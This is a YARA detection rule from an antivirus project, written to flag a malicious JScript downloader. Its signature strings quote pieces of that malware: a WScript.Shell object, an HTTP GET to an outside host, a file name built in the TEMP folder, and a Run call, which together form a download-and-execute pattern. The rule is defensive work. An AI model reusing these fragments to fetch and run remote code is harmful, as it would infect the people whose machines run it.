rule sig_20160330_5d984ef23a51626cc5a4a0a75b538d5d {
  meta:
    description = "datamaliciousorder - file 20160330_5d984ef23a51626cc5a4a0a75b538d5d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "04ec0cb16aaf74bc5a2b825d1a3fbb122d32bfe0349ba319e5ace37b3a0abd8f"

  strings:
    $s1  = "var KG = function X() {return WScript[BO](\"WScript\"+\".Shell\");}(), E0 = 11;" fullword ascii
    $s2  = "W1[G0](\"GET\", \"http://vtdrive.kz/f6dh1a\", false);" fullword ascii
    $s3  = "function BL(M0, FU){GK = GK * 1; return M0 - FU;};" fullword ascii
    $s4  = "if (W1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QP() {return KG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"eEYG4Q0MQodxtRa2.ex\" + \"e\";};" fullword ascii
    $s6  = "function Q(){return K + \"\";};" fullword ascii
    $s7  = "function E() {return ((DO == true) && (DO == S0)) ? 1 : GK;};" fullword ascii
    $s8  = "function S(RD){KG[\"Run\"](RD, GK, GK);};" fullword ascii
    $s9  = "function O(){return 22;};" fullword ascii
    $s10 = "}while (J);" fullword ascii
    $s11 = "function IN(RG) {var JG = (1, 2, 3, 4, 5, RG); return JG;};" fullword ascii
    $s12 = "var CN = new this[\"Date\"]();" fullword ascii
    $s13 = "return BL(CN0, W0);" fullword ascii
    $s14 = "function G(){return BO;};" fullword ascii
    $s15 = "var S0 = false;" fullword ascii
    $s16 = "DO = true; " fullword ascii
    $s17 = "var DO = false;" fullword ascii
    $s18 = "S0 = true; " fullword ascii
    $s19 = "var SC = false;" fullword ascii
    $s20 = "} catch(M){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}